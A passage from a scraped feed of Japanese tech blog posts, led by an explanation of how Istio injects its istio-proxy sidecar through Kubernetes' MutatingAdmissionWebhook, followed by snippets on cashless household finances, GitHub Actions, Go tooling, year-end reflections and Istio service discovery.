AdmissionReviewAdmissionReviewは以下のようなJSONであり、kube-apiserverとwebhookサーバーの間でAdmissionRequestとAdmissionResponseを運びます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {},  # AdmissionResponse  \\"response\\": {},}↪️ 参考：v1 package - k8s.io/api/admission/v1 - Go Packages▼ AdmissionRequestAdmissionRequestは以下のようなJSONです。kube-apiserverがクライアントから受信した操作内容が持つことがわかります。例で挙げたAdmissionRequestでは、クライアントがDeploymentをCREATE操作するリクエストをkube-apiserverに送信したことがわかります。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"apps\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"deployments\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}↪️ 参考：Dynamic Admission Control | Kubernetes▼ AdmissionResponse一方でAdmissionResponseは、例えば以下のようなJSONです。AdmissionResponseに応じたマニフェスト変更処理をpatchキーの値に持ち、これはbase64方式でエンコードされています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"<value from request.uid>\\",      # 宛先のwebhookサーバーが受信したか否かを表す。      \\"allowed\\": true,      # PathによるPatch処理を行う。      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvcmVwbGljYXMiLCAidmFsdWUiOiAzfV0=\\",    },}エンコード値をデコードしてみると、例えば以下のようなpatch処理が定義されています。# patchキーをbase64方式でデコードした場合[{\\"op\\": \\"add\\", \\"path\\": \\"/spec/replicas\\", \\"value\\": 3}]マニフェストに対する操作 (op) 、キー (path) 、値 (value) が設定されています。kube-apiserverがこれを受信すると、指定されたキー (.spec.replicas) に値 (3) に追加します。↪️ 参考：Dynamic Admission Control | Kubernetes04. サイドカーインジェクションの仕組み全体のフロー前提知識を踏まえた上で、admission-controllersアドオンの仕組みの中で、サイドカーのistio-proxyコンテナがどのようにPodにインジェクションされるのかを見ていきましょう。最初に、サイドカーインジェクションのフローは以下の通りになっています。画像の文字が小さくなってしまったため、拡大していただけると\uD83D\uDE47\uD83C\uDFFB‍♂️↪️ 参考：Amazon.co.jp: Istio in Action (English Edition) 電子書籍: Posta, Christian E., Maloku, Rinor: 洋書クライアント ➡︎ kube-apiserverここで説明するフロー箇所『クライアント ➡︎ kube-apiserver』の箇所を説明します。【１】 Podの作成をリクエストまずは、クライアントがkube-apiserverにリクエストを送信するところです。クライアント (Deployment、DaemonSet、StatefulSet、を含む) は、Podの作成リクエストをkube-apiserverに送信します。この時のリクエスト内容は、以下の通りとします。# Podを作成する。$ kubectl apply -f foo-pod.yaml# foo-pod.yamlファイルapiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80またNamespaceでは、あらかじめistio-proxyコンテナのインジェクションが有効化されているとします。Istioではv1.10以降、リビジョンの番号のエイリアスを使用して、istio-proxyコンテナのインジェクションを有効化するようになりました。エイリアスはどんな値でも問題なく、よくあるエイリアスとしてdefaultやstableなどを使用します。apiVersion: v1kind: Namespacemetadata:  name: foo-namespace  labels:    # istio-proxyコンテナのインジェクションを有効化する。    # エイリアスは自由    istio.io/rev: <エイリアス>↪️ 参考：Istio / Announcing Support for 1.8 to 1.10 Direct Upgradeskube-apiserver ➡︎ Serviceここで説明するフロー箇所『kube-apiserver ➡︎ Service』の箇所を説明します。【２】 認証認可処理をコールkube-apiserverは、認証ステップと認可ステップにて、クライアントからのリクエストを許可します。【３】 アドオンの処理をコールkube-apiserverは、mutating-admissionステップにて、MutatingAdmissionWebhookプラグインの処理をコールします。前提知識の部分で具体的な実装を省略しましたが、Istioのバージョン1.14.3時点で、MutatingWebhookConfigurationは以下のようになっています。Namespaceでサイドカーインジェクションを有効化する時に使用したエイリアスは、このMutatingWebhookConfigurationで実体のリビジョン番号と紐づいています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yamlapiVersion: admissionregistration.k8s.io/v1beta1kind: MutatingWebhookConfigurationmetadata:  name: istio-revision-tag-default  labels:    app: sidecar-injector    # エイリアスの実体    istio.io/rev: <リビジョン番号>    # リビジョン番号のエイリアス    istio.io/tag: <エイリアス>webhooks:  - name: rev.namespace.sidecar-injector.istio.io    # MutatingAdmissionWebhookプラグインの処理の発火条件を登録する。    rules:      - apiGroups: [\\"\\"]        apiVersions: [\\"v1\\"]        operations: [\\"CREATE\\"]        resources: [\\"pods\\"]        scope: \\"*\\"    # Webhookの前段にあるServiceの情報を登録する。    clientConfig:      service:        name: istiod-<リビジョン番号>        namespace: istio-system        path: \\"/inject\\" # エンドポイント        port: 443      caBundle: Ci0tLS0tQk ...    # Namespace単位のサイドカーインジェクション    # 特定のNamespaceでMutatingAdmissionWebhookプラグインの処理を発火させる。    namespaceSelector:      matchExpressions:        - key: istio.io/rev          operator: DoesNotExist        - key: istio-injection          operator: DoesNotExist    # Pod単位のサイドカーインジェクション    # 特定のオブジェクトでMutatingAdmissionWebhookプラグインの処理を発火させる。    objectSelector:      matchExpressions:        - key: sidecar.istio.io/inject          operator: NotIn          values:            - \\"false\\"        - key: istio.io/rev          operator: In          values:            - <エイリアス>    ...MutatingWebhookConfigurationには、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を定義します。MutatingAdmissionWebhookプラグインの発火条件に関して、例えばIstioでは、 NamespaceやPod.metadata.labelsキーに応じてサイドカーインジェクションの有効化/無効化を切り替えることができ、これをMutatingAdmissionWebhookプラグインで制御しています。webhookサーバーの宛先情報に関して、Istioではwebhookサーバーの前段にServiceを配置しています。MutatingAdmissionWebhookプラグインが発火した場合、Serviceの/inject:443にHTTPSプロトコルのリクエストを送信するようになっています。また、送信先のServiceの名前がistiod-<リビジョン番号>となっていることからもわかるように、Serviceは特定のバージョンのIstiodコントロールプレーンに対応しており、想定外のバージョンのIstiodコントロールプレーンを指定しないように制御しています。一方で発火しなかった場合には、以降のAdmissionReviewの処理には進みません。【４】 AdmissionRequestに値を詰めるkube-apiserverは、mutating-admissionステップにて、クライアントからのリクエスト内容 (Podの作成リクエスト) をAdmissionReveiew構造体のAdmissionRequestに詰めます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"core\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"pods\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}【５】 AdmissionReviewを送信kube-apiserverは、mutating-admissionステップにて、Serviceの/inject:443にAdmissionReview構造体を送信します。Service ➡︎ webhookサーバーここで説明するフロー箇所『Service ➡︎ webhookサーバー』の箇所を説明します。【６】 15017番ポートにポートフォワーディングServiceは、/inject:443でリクエストを受信し、discoveryコンテナの15017番ポートにポートフォワーディングします。Istioのバージョン1.14.3時点で、Serviceは以下のようになっています。$ kubectl get svc istiod-service -n istio-system -o yamlapiVersion: v1kind: Servicemetadata:  namespace: istio-system  name: istiod-<リビジョン番号>  labels:    app: istiodspec:  type: ClusterIP  selector:    app: istiod    istio.io/rev: <リビジョン番号>  ports:    - name: grpc-xds      port: 15010      protocol: TCP      targetPort: 15010    - name: https-dns      port: 15012      protocol: TCP      targetPort: 15012    # webhookサーバーにポートフォワーディングする。    - name: https-webhook      port: 443      protocol: TCP      targetPort: 15017    - name: http-monitoring      port: 15014      protocol: TCP      targetPort: 15014.spec.selector.istio.io/revキーに、ポートフォワーディング先のPodを指定するためのリビジョン番号が設定されており、このPodはdiscoveryコンテナを持ちます。Istioは、discoveryコンテナ内でwebhookサーバーを実行し、15017番ポートでリクエストを待ち受けます。ここで、discoveryコンテナがリクエストを待ち受けているポート番号を見てみると、15017番ポートでリッスンしていることを確認できます。$ kubectl exec foo-istiod -n istio-system -- netstat -tulpnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      1/pilot-discoverytcp6       0      0 :::15017                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::8080                 :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15010                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15012                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15014                :::*                    LISTEN      1/pilot-discovery↪️ 参考：istio/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubIstio / Application Requirementskube-apiserver ⬅︎ Service ⬅︎ webhookサーバーここで説明するフロー箇所『kube-apiserver ⬅︎ Service ⬅︎ webhookサーバー』の箇所を説明します。【７】 patch処理を定義仕組みの中でも、ここは重要な部分です。discoveryコンテナ内のwebhookサーバーは、リクエスト内容を書き換えるためのpatch処理を定義します。webhookサーバーは、マニフェストの.spec.containers[1]パスにistio-proxyキーを追加させるようなpatch処理を定義します。この定義によって、結果的にサイドカーのインジェクションが起こるということになります。[  ...  {    \\"op\\": \\"add\\",    # .spec.initContainers[1] を指定する。    \\"path\\": \\"/spec/initContainers/1\\",    # マニフェストファイルに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-init\\",      \\"resources\\": {                     ...      }    }  },  {    \\"op\\": \\"add\\",    # .spec.containers[1] を指定する。    \\"path\\": \\"/spec/containers/1\\",    # マニフェストファイルに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-proxy\\",      \\"resources\\": {                     ...      }    }  }  ...]↪️ 参考：istio/webhook.go at a19b2ac8af3ad937640f6e29eed74472034de2f5 \xb7 istio/istio \xb7 GitHubistio/webhook_test.go at 1.14.3 \xb7 istio/istio \xb7 GitHub本題と話が逸れるため今回は詳しく言及しませんが、上記のpathc処理ではサイドカーコンテナのistio-proxyコンテナの他に、initコンテナのistio-initコンテナもインジェクションできるようにします。このistio-initコンテナは、istio-proxyコンテナを持つPodでインバウンド/アウトバウンド通信の経路を制御できるように、Pod内にiptablesのルールを適用する責務を担っています\uD83D\uDCAA\uD83C\uDFFB↪️ 参考：Istio Sidecar\'s interception mechanism for traffic - SoByte【８】 AdmissionResponseに値を詰めるdiscoveryコンテナ内のwebhookサーバーは、patch処理の定義をAdmissionReveiew構造体のAdmissionResponseに詰めます。patchキーの値に、先ほどのpatch処理の定義をbase64方式でエンコードした文字列が割り当てられています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"*****\\",      \\"allowed\\": true,      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"<先ほどのpatch処理の定義をbase64方式でエンコードした文字列>\\",    },}↪️ 参考：istio/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub【９】 AdmissionReviewを返信discoveryコンテナ内のwebhookサーバーは、AdmissionReview構造体をレスポンスとしてkube-apiserverに返信します。kube-apiserver ➡︎ etcdここで説明するフロー箇所『kube-apiserver ➡︎ etcd』の箇所を説明します。【１０】 patch処理をコールkube-apiserverは、AdmissionReview構造体を受信し、AdmissionResponseに応じてリクエスト内容を書き換えます。patch処理の定義をAdmissionReview構造体から取り出し、クライアントからのリクエスト内容を書き換えます。具体的には、istio-proxyコンテナとistio-initコンテナを作成できるように、リクエストしたマニフェストの該当箇所にキーを追加します。apiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80    # kube-apiserverが追加    - name: istio-proxy      ...  # kube-apiserverが追加  initContainers:    - name: istio-init    ...【１１】 マニフェストを永続化kube-apiserverは、etcdにPodのマニフェストを永続化します。クライアント ⬅︎ kube-apiserverここで説明するフロー箇所『クライアント ⬅︎ kube-apiserver』の箇所を説明します。【１２】 コール完了を返信kube-apiserverは、クライアントにレスポンスを受信します。$ kubectl apply -f foo-pod.yaml# kube-apiserverからレスポンスが返ってくるpod \\"foo-pod\\" created以降の仕組みkube-apiserverは、他のNodeコンポーネント (kube-controlleretcd、kube-scheduler、kubelet、など) と通信し、Podを作成します。このPodのマニフェストは、アプリコンテナの他に、istio-proxyコンテナとistio-initコンテナを持ちます。結果として、サイドカーコンテナのistio-proxyコンテナをインジェクションしたことになります。本題と話が逸れるため今回は詳しく言及しませんが、kube-apiserverと他コンポーネントの通信については、以下の方の記事と図が非常に参考になると思います\uD83D\uDE47\uD83C\uDFFB‍♂️↪️ 参考：Kubernetes Master Components: Etcd, API Server, Controller Manager, and Scheduler | by Jorge Acetozi | jorgeacetozi | Medium05. おわりにIstioのサイドカーインジェクションの仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。今回登場したMutatingAdmissionWebhookプラグインに関して、私の関わっているプロダクトではIstio以外 (例：CertManager、Prometheus、AWSのaws-eks-vpc-cniアドオン、など) でも使用しています。そのため、MutatingAdmissionWebhookプラグインをどのように使っているのかを一度知れば、知識の汎用性が高いと考えています✌\uD83C\uDFFBサイドカーインジェクションはIstioでも基本的な機能であり、もし未体験の方がいらっしゃれば、お手元でサイドカーコンテナが追加されることを確認していただくとよいかもしれません\uD83D\uDC4D","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/01/14/223815","isoDate":"2023-01-14T13:38:15.000Z","dateMiliSeconds":1673703495000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"2023年1月版キャッシュレス生活まとめ","contentSnippet":"去年も書いたので今年も書く。pranc1ngpegasus.hatenablog.com図および下記文章における「夫」は筆者を指す。主なアップデート内容夫の収入の流入経路が簡素化されました妻が住信SBIネット銀行およびSBI証券を開設しました妻がつみたてNISAをはじめました2021年に生まれた第一子を追加しました第一生命NEOBANK2023年1月からサービスが開始された第一生命NEOBANKが追加された。通常の住信SBIネット銀行は15歳以上のみ口座開設ができるのだが、第一生命との提携NEOBANKでは親が第一生命支店に口座を持っている場合に限り0歳から口座開設が可能になった。我が家ではSBI証券を通じてつみたてNISAやジュニアNISAを利用しているので銀行も住信SBIネット銀行であるほうがありがたい。これまで子の銀行口座は楽天銀行を使っていたが、第一生命NEOBANKに移行したことで親から子への振込手数料などが発生しなくなった。「親が第一生命支店に口座を持っている場合に限り…」の制約があるので夫のおこづかい口座も第一生命NEOBANKになった。まとめいろんなサービスを試してみたり、辞めてみたりしていると持ち物が多くなってしまって煩雑になる。年に一度でも図に起こしてみると、本当に必要なものなのか判断できるし無駄な部分に気づけるのでおすすめ。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2023/01/13/225206?utm_source=feed","isoDate":"2023-01-13T13:52:06.000Z","dateMiliSeconds":1673617926000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"xmllint で HTML 内の任意の値を取り出す","contentSnippet":"サクッと shell script で HTML の中の何かを取り出したい時があります。 そんな時に使えるのが xmllint. しっかりやるなら python の Beautiful Soup を使ったりしますが、本当に簡単なことを簡単にやりたい場合に xmllint","link":"https://blog.1q77.com/2023/01/xmllint-html-xpath/","isoDate":"2023-01-12T14:40:51.000Z","dateMiliSeconds":1673534451000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"MongoDB Atlas の紹介","contentSnippet":"MongoDB Atlas とは MongoDB Atlas (以下 Atlas という)は、MongoDB Inc.によって作られた MongoDB の DBaaS(DB as a Service) です。 Atlas […]The post MongoDB Atlas の紹介 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/mongodb-atlas/","isoDate":"2023-01-11T23:57:02.000Z","dateMiliSeconds":1673481422000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GitHub Actions で機密性の無い変数を設定できるようになったので試してみる","contentSnippet":"GitHub Actions で変数を設定できるようになりました \uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89https://github.blog/changelog/2023-01-10-github-actions-support-for-configuration-variables-in-workflows/これまではワークフローで再利用可能な値を使用するためには Secret として保存する必要がありました。しかし Secret は一度設定すると値を確認することができないため、機密性の無いデータでもどんな値が設定されているかを確認することができないのが不便でした。今回の更新で、機密性の無いデータは変数と...","link":"https://zenn.dev/kou_pg_0131/articles/gh-actions-configurations-variables","isoDate":"2023-01-11T10:07:51.000Z","dateMiliSeconds":1673431671000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"Go でイケてる CLI を作るために利用したパッケージ","contentSnippet":"先日、 cLive というターミナルを自動操作する Go 製のコマンドラインツールを公開しました。https://github.com/koki-develop/clive#readmecLive で JavaScript のライブコーディングをするデモこの記事では Go でイケてる感じの CLI を作るために利用したパッケージを簡単に紹介します。cLive については以下の記事をご参照ください。https://zenn.dev/kou_pg_0131/articles/clive-introduction 利用したパッケージCobra : CLI フレームワーク...","link":"https://zenn.dev/kou_pg_0131/articles/go-cli-packages","isoDate":"2023-01-10T10:05:41.000Z","dateMiliSeconds":1673345141000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"CodeDeploy Agent のバージョンアップを自動化する","contentSnippet":"概要 Auto Scaling Group 内のインスタンスで CodeDeploy を使用する場合、Agent のバージョンアップが手間なので AMI にインストールしない方がよいです。 Systems Manager […]The post CodeDeploy Agent のバージョンアップを自動化する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codedeploy-agent-update/","isoDate":"2023-01-10T01:22:39.000Z","dateMiliSeconds":1673313759000,"authorName":"Sreake","authorId":"Sreake"},{"title":"HTML/CSS を SVG に変換する Vercel 製のパッケージ「satori」を試してみる","contentSnippet":"Next.js では Vercel\'s Edge Functions を使用して動的に OGP 画像を生成できる @vercel/og という Vercel 製のパッケージが公開されています。https://www.npmjs.com/package/@vercel/ogこの @vercel/og では内部的に satori という HTML/CSS を SVG に変換するパッケージが使用されています。https://www.npmjs.com/package/satori面白そうだったので簡単に試してみたメモです。こういう SVG も簡単に作れます。バッジっぽいやつ ...","link":"https://zenn.dev/kou_pg_0131/articles/satori-usage","isoDate":"2023-01-02T10:42:56.000Z","dateMiliSeconds":1672656176000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"イェーイ あけまして 2023","contentSnippet":"あいさつ謹んで新春をお祝い申し上げます。旧年中は大変お世話になり、誠にありがとうございました。皆様は、にぎやかに、楽しくお過ごしのことと存じます。旧年は同棲をする、家を締め出される、原因不明の体調不良に陥る、クリスマスに同棲解消決定、転居決定 など、人生の不条理さ否応なしに思い知らされた2022年でした。イェーイ！登壇登壇をいくつかしましたがあまり注目されることはなかった気がします。もう少し有用だと思われる発表を頑張りたいと思います。b.hatena.ne.jpブログいくつかのブログを書いた。たまにはてなブックマークにあがったりなどしました。来年はもう少しブログを書いて量を出していきたいと思いました。b.hatena.ne.jp2022年の振り返り（KPT）Keep技術書籍以外もたくさん読むことができた登壇の目標は達成できた人生ができていたブログの投稿数は目標達成できた人を巻き込んで仕事ができたProblem人生をやった分、手を動かす時間が少なくなってしまった人生でもっと頭を使っていくそこそこ大きな失敗をしてメンタルブレイクしてた時期があり、復旧に時間が掛かった原因不明の体調不良の時間が増えたTry積ん読を減らす人生を推測せず計測する心身の健康(運動して痩せる)ブログを書くさいごに去年からアフィリエイトをブログを載せるようになりました。資本主義への敗北感があります。書籍代の数%にならねーかなって思っているので嫌いになって下さい。2023年も引き続きよろしくお願いします。知らない人からでも、お茶に誘われると喜ぶので誘ってください。2023年の目標は健康と健忘です。ごめん、同級会にはいけません。いま、ジムにいます。あけましておめでとうございます\uD83C\uDF8D⛩ pic.twitter.com/AjjH18g1JC— nwiizo (@nwiizo) 2022年12月31日","link":"https://syu-m-5151.hatenablog.com/entry/2023/01/01/145552","isoDate":"2023-01-01T05:55:52.000Z","dateMiliSeconds":1672552552000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"2022年を振り返る","contentSnippet":"年の瀬ですね。個人的あっという間に終わった1年ランキング第一位の2022年を掻い摘んで振り返ってみます。2021年から継続していたこと自宅の新築計画毎週のように工務店さんに通って計画を練っていた子育て2021年6月に娘が生まれた1月娘がつかまり立ち、伝い歩きをするようになった2月娘が靴デビューした外で靴に慣れる練習をしはじめた娘氏はじめての散髪前髪が伸びてきたので切った3月娘を連れてはじめての帰省娘から見たひいひいおばあちゃんに会った (高祖母というらしい)帰省中に実家で一人歩きが急成長した初節句の写真撮影をした4月娘がヘルメット治療をはじめたpranc1ngpegasus.hatenablog.com5月新築計画を断念しばらくはペット可の戸建て賃貸で暮らそうとなった娘がワンコのリードを持って散歩したがりはじめた散歩してるのか、散歩されてるのかわからん6月娘が1歳になった一升餅を軽々と背負って歩いた引っ越した新築を断念して一軒家の賃貸へKyashを退職したpranc1ngpegasus.hatenablog.com7月スリーシェイクにジョインしたpranc1ngpegasus.hatenablog.com8月秋田県に大曲の花火を見にいった雨で空腹 + おんぶ移動したら歩きたいでギャン泣きはじめての花火を驚いた顔をして楽しんでいた様子9月ライカSL2-Sを買った娘が活動的になってきたので写真できれいに残したくなった娘との朝んぽがさらに楽しくなった10月娘のヘルメット治療がおわったヘルメット内が蒸れる時期を一緒にがんばった遅いスタートだったけどめちゃめちゃ改善した娘がはじめて風邪をひいた40℃の発熱寒くなってきたのに薄着のまま外で遊ばせてしまったせいかも…11月来夏から履くクルマのホイールを買ったいままで純正ホイールに夏/冬タイヤを履き替えてもらっていた満足のいくデザインのホイールを手に入れたので満足娘のイヤイヤ期が顕著になってきたまだまだ序章なんだろうけど難しい!はじめてワンワンわんだーらんどを観にいった娘氏、大興奮親も初わんわんで楽しめた12月娘氏はじめてのクリスマスパーティご飯もプレゼントも喜んでくれたまとめほとんど子育ての内容だった。来年はまた家族が増える予定なので、さらにがんばっていこー。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/12/30/100437?utm_source=feed","isoDate":"2022-12-30T01:04:37.000Z","dateMiliSeconds":1672362277000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Lima の vmType VZ と virtiofs を試す","contentSnippet":"Lima が version 0.14.0 で QEMU だけではなく macOS の Virtualization.Framework に対応していました。 vmtype という設定項目が増えています。 この新しい Framework では Host のディレクトリをマウントするのに virtiofs が使えるようになっており、","link":"https://blog.1q77.com/2022/12/lima-vz/","isoDate":"2022-12-29T15:49:47.000Z","dateMiliSeconds":1672328987000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"rbspy で ruby の stacktrace を flamegraph にする","contentSnippet":"中身をよく知らない Rails アプリでどこが遅いのかな？と思って rbspy ( github) を試してみたのでメモ。 とりあえず使って flamegraph を書き出してみたんだけどそもそも flamegraph がどういうものなのか分かっ","link":"https://blog.1q77.com/2022/12/rbspy/","isoDate":"2022-12-28T11:26:10.000Z","dateMiliSeconds":1672226770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Professional Cloud Security Engineer の振り返り","contentSnippet":"はじめに2022/12/28 に Google Cloud Certification の１つである、Professional Cloud Security Engineer に合格したので、そち…","link":"https://qiita.com/dirtymosschan/items/2c66eec7919220a4ec06","isoDate":"2022-12-28T08:57:17.000Z","dateMiliSeconds":1672217837000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"go.mod の更新","contentSnippet":"たまに使い捨ての code を書いて放置する程度だと毎回ググってしまうのでメモ。 go.mod の更新は go get や go mod tidy で行うことができる。 go の version を更新> go の version を更新 # go.mod 内の go の version は次のよ","link":"https://blog.1q77.com/2022/12/updage-go-mod/","isoDate":"2022-12-27T03:52:31.000Z","dateMiliSeconds":1672113151000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub Actions でプライベートリポジトリの Action を共有できるようになったので試してみる","contentSnippet":"先日 GitHub Actions で同一ユーザーもしくは組織内でプライベートリポジトリの Action が共有できるようになりました。https://github.blog/changelog/2022-12-14-github-actions-sharing-actions-and-reusable-workflows-from-private-repositories-is-now-ga/実際の挙動や必要な設定が気になったので試してみたメモです。 要約プライベートリポジトリの Action・Reusable Workflow・Composite Action を同一オー...","link":"https://zenn.dev/kou_pg_0131/articles/gh-actions-share-private","isoDate":"2022-12-26T10:51:28.000Z","dateMiliSeconds":1672051888000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"【Istio⛵️】サービスディスカバリーの仕組み","contentSnippet":"01. はじめに02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはなぜサービスディスカバリーが必要なのかサービスディスカバリーの要素サービスディスカバリーのパターンサービスディスカバリーのパターンとはサーバーサイドパターンクライアントサイドパターン03. IstioのサービスディスカバリーIstioのサービスディスカバリーの仕組み全体像【１】【２】【３】【４】【５】discoveryコンテナの仕組みistio-proxyコンテナの仕組み04. istio-proxyコンテナ内のEnvoyの仕組みEnvoyの処理の流れ全体像【１】【２】【３】【４】【５】【６】EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイントリスナー値▼ 確認方法▼ 結果ルート値▼ 確認方法▼ 結果クラスター値▼ 確認方法▼ 結果エンドポイント値▼ 確認方法▼ 結果Envoyの処理の流れのまとめ【１】【２】【３】【４】【５】【６】05. おわりに謝辞01. はじめに3-shake Advent Calender 2022 最終日の記事です\uD83C\uDF85\uD83C\uDF84私は普段は 俺の技術ノート に知見を記録しており、はてなブログはデビュー戦となります。さて今回は、サービスメッシュを実装するIstioのサービスディスカバリーに関する記事を投稿しました\uD83D\uDE80Istioの機能の一つである『サービスディスカバリー』の仕組みを、Envoyを交えながら、もりもり布教しようと思います (沼のまわりに餌をまく) 。今回の記事では、先日の 3-shake SRE Tech Talk で発表した内容に加えて、スライドの余白と発表時間の制約で記載できなかったことも記載しました\uD83D\uDE17↪️ 参考：Istio⛵️によるサービスディスカバリーの仕組み - Speaker Deck02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはマイクロサービスアーキテクチャでは、マイクロサービスからマイクロサービスにリクエストを送信する場面があります。サービスディスカバリーとは、宛先マイクロサービスの宛先情報 (例：IPアドレス、完全修飾ドメイン名、など) を検出し、送信元マイクロサービスが宛先マイクロサービスにリクエストを継続的に送信できるようにする仕組みのことです。なぜサービスディスカバリーが必要なのかそもそも、なぜサービスディスカバリーが必要なのでしょうか。マイクロサービスアーキテクチャでは、システムの信頼性 (定められた条件下で定められた期間にわたり、障害を発生させることなく実行する程度) を担保するために、マイクロサービスのインスタンスの自動スケーリングを採用します。この時、自動スケーリングのスケールアウトでマイクロサービスが増加するたびに、各インスタンスには新しい宛先情報が割り当てられてしまいます。また、マイクロサービスが作り直された場合にも、宛先情報は更新されてしまいます。このように、たとえインスタンスの宛先情報が更新されたとしても、インスタンスへのリクエストに失敗しない仕組みが必要です。サービスディスカバリーの要素サービスディスカバリーの仕組みは、次の要素からなります。名前解決に関しては、DNSベースのサービスディスカバリー (例：CoreDNS + Service + kube-proxyによるサービスディスカバリー) で必要となり、Istioでは使いません。そのため、本記事では言及しないこととします\uD83D\uDE47\uD83C\uDFFB‍ 要素                    責務                                                                    送信元マイクロサービス  リクエストを送信する。                                                  宛先マイクロサービス    リクエストを受信する。                                                  サービスレジストリ      宛先マイクロサービスの宛先情報を保管する。                              ロードバランサー        宛先マイクロサービスのインスタンスにロードバランシングする。            名前解決                宛先マイクロサービスへのリクエスト送信時に、名前解決できるようにする。 サービスディスカバリーのパターンサービスディスカバリーのパターンとはサービスディスカバリーの仕組みにはいくつか種類があります。Istioのサービスディスカバリーは、このうちのサーバーサイドパターンを実装したものになります。サーバーサイドパターン送信元マイクロサービスから、問い合わせとロードバランシングの責務が切り離されています。送信元マイクロサービスは、ロードバランサーにリクエストを送信します。ロードバランサーは、宛先マイクロサービスの宛先をサービスレジストリに問い合わせ、またリクエストをロードバランシングする責務を担っています\uD83D\uDCAA\uD83C\uDFFB(例) Istio、Linkerd、など↪️ 参考：Amazon.co.jp: Cloud Native Patterns: Designing change-tolerant software (English Edition) 電子書籍: Davis, Cornelia: 洋書Server-side service discovery patternクライアントサイドパターン通信の送信元マイクロサービスは、宛先マイクロサービスの宛先をサービスレジストリに問い合わせ、さらにロードバランシングする責務を担います。(例) NeflixのEureka、など↪️ 参考：Amazon.co.jp: Cloud Native Patterns: Designing change-tolerant software (English Edition) 電子書籍: Davis, Cornelia: 洋書Client-side service discovery patternService Discovery in Kubernetes: Combining the Best of Two Worlds03. IstioのサービスディスカバリーIstioのサービスディスカバリーの仕組みIstioが実装するサービスメッシュには、サイドカープロキシメッシュとアンビエントメッシュがあり、今回はサイドカープロキシメッシュのサービスディスカバリーを取り上げます。Istioのサービスディスカバリーは、discoveryコンテナとistio-proxyコンテナが軸となり、サーバーサイドパターンのサービスディスカバリーを実装します。全体像【１】 〜 【６】の全体像は、以下の通りです\uD83D\uDC47istio-proxyコンテナは、サービスレジストリへの問い合わせと、ロードバランシングする責務を担っていることに注目してください。【１】kube-apiserverは、Pod等の宛先情報をetcd等に保管します。これは、Kubernetesの通常の仕組みです。【２】discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得し、自身に保管します。【３】istio-proxyコンテナは、discoveryコンテナからPod等の宛先情報を双方向ストリーミングRPCで取得します。【４】送信元マイクロサービスがリクエストを送信します。サーバーサイドパターンでの責務通り、送信元マイクロサービスはロードバランサー (ここではistio-proxyコンテナ) 